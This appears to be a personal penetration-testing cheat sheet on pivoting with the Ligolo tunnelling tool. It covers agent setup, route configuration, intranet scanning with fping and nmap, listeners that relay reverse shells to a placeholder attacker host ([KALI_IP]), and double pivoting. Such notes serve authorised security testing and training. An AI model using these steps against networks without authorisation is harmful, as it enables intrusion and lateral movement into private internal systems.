# Port Forwarding
*   Ligolo
    *   Setup
        *   Kali        → `ligstart()`
        *   Pivot     → `ligolo-agent -connect [KALI_IP]:11601 -ignore-cert`
        *   Kali        → `sudo ip route add [ROUTE] dev ligolo`
        *   Ligolo   → `session` → Select Number → `start`
    *   Local Forwarding
        *   Route    → `240.0.0.1/32`
        *   Access   → `240.0.0.1:[PORT]` (Universal IP - Change Session to access other pivot's local ports)
    *   Dynamic Forwarding
        *   Route → `[INTRANET_CIDR]`
            *   Generic    → `192.168.0.0/16`, `172.16.0.0/12`, `10.0.0.0/8`
            *   Linux        → `ip route`
            *   Windows → `route PRINT` → Check Router + Mask
        *   Ping Sweep / Service Scanning
            *   `fping -asgq        [INTRANET_CIDR]`
            *   `sudo nmap -PE -sCV [INTRANET_IP]`
        *   Shells / File Transfers
            *   Kali                             → `listener_add --addr 0.0.0.0:30000 --to [KALI_IP]:[KALI_PORT] --tcp` 
            *   Intranet Machine   → Request/Send Shell To → `[FIRST_PIVOT_INTRANET_IP]:30000`
        *   Double Pivoting
            *   Ligolo                 → Select Pivot Session + `listener_add --addr 0.0.0.0:11601 --to [KALI_IP]:11601 --tcp`
            *   Second Pivot   → `ligolo-agent -connect [FIRST_PIVOT_INTRANET_IP]:11601 -ignore-cert`
            *   Kali                     → `ligcreate() ligolo2` + `sudo ip route add [SECOND_INTRANET_CIDR] dev ligolo2`
            *   Ligolo                → `session` → Select Number → `start --tun ligolo2`